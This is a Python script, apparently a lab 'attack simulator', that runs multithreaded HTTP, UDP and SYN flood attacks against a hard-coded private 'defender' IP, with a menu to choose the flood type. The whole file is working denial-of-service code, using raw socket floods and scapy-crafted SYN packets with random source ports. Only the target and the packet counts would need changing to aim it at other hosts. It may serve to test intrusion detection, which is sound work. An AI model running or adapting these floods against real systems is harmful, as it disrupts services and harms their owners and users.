import threading
import requests
import socket
import random
import time
from scapy.all import IP, TCP, UDP, send

# ==========================
# CONFIG
# ==========================
TARGET_IP = "192.168.1.4"   # Defender machine IP
TARGET_PORTS = {
    "http": 5000,
    "udp": 5001,
    "syn": 8081,
}

# Smaller defaults make the demo finish quickly and consistently
ATTACK_THREADS = 10
PACKETS_PER_THREAD = 500

HTTP_TIMEOUT = 0.1

# ==========================
# HTTP FLOOD ATTACK
# ==========================
def http_flood(target_port):
    session = requests.Session()

    for _ in range(PACKETS_PER_THREAD):
        try:
            session.get(
                f"http://{TARGET_IP}:{target_port}",
                timeout=HTTP_TIMEOUT
            )
        except:
            pass

# ==========================
# UDP FLOOD ATTACK
# ==========================
def udp_flood(target_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    payload = random._urandom(1024)

    for _ in range(PACKETS_PER_THREAD):
        try:
            sock.sendto(payload, (TARGET_IP, target_port))
        except:
            pass

    sock.close()

# ==========================
# SYN FLOOD ATTACK
# ==========================
def syn_flood(target_port):
    for _ in range(PACKETS_PER_THREAD):
        try:
            src_port = random.randint(1024, 65535)

            packet = (
                IP(dst=TARGET_IP) /
                TCP(
                    sport=src_port,
                    dport=target_port,
                    flags="S"
                )
            )

            send(
                packet,
                verbose=False,
                inter=0
            )

        except:
            pass

# ==========================
# ATTACK RUNNER
# ==========================
def run_attack(attack_type):
    threads = []

    if attack_type == "http":
        attack_func = http_flood

    elif attack_type == "udp":
        attack_func = udp_flood

    elif attack_type == "syn":
        attack_func = syn_flood

    else:
        print("Invalid attack type.")
        return

    target_port = TARGET_PORTS[attack_type]

    print(f"\nStarting {attack_type.upper()} flood attack...")
    print(
        f"Target: {TARGET_IP}:{target_port} | "
        f"Threads: {ATTACK_THREADS} | "
        f"Packets/thread: {PACKETS_PER_THREAD}"
    )

    start_time = time.time()

    for _ in range(ATTACK_THREADS):
        t = threading.Thread(
            target=attack_func,
            args=(target_port,),
            daemon=True
        )

        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    duration = time.time() - start_time

    total_packets = ATTACK_THREADS * PACKETS_PER_THREAD

    print(
        f"{attack_type.upper()} attack completed "
        f"in {duration:.2f} sec"
    )

    print(
        f"Approx packets sent: {total_packets}"
    )

# ==========================
# MAIN MENU
# ==========================
if __name__ == "__main__":
    print("==== ATTACK SIMULATOR ====")
    print(f"Target IP: {TARGET_IP}")
    print(f"HTTP Port: {TARGET_PORTS['http']}")
    print(f"UDP Port: {TARGET_PORTS['udp']}")
    print(f"SYN Port: {TARGET_PORTS['syn']}")
    print("")
    print("1. HTTP Flood")
    print("2. UDP Flood")
    print("3. SYN Flood")

    choice = input("Choose attack type (1/2/3): ").strip()

    if choice == "1":
        run_attack("http")

    elif choice == "2":
        run_attack("udp")

    elif choice == "3":
        run_attack("syn")

    else:
        print("Invalid choice.")